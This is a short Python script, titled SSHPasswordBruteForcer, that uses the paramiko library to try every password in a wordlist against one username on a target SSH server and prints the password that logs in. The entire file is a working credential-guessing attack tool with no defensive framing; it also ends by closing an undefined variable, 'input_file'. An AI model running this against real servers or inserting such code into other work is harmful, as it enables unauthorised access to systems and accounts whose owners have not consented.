import paramiko
import sys
import os
import argparse

parser = argparse.ArgumentParser(description="SSHPasswordBruteForcer")
parser.add_argument("-t", "--target", help="Target IP address.")
parser.add_argument("-p", "--port", help="Target SSH port.")
parser.add_argument("-u", "--username", help="Username.")
parser.add_argument("-w", "--passlist", help="Password wordlist.")

args = parser.parse_args()
target = args.target
port = args.port
username = args.username
password_file = args.passlist

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            print("Trying password " + password + " for user " + username)
            response = ssh_connect(password)

            if response == 0:
                 print('Password found: '+ password)
                 exit(0)
        except Exception as e:
            print(e)
        pass

input_file.close()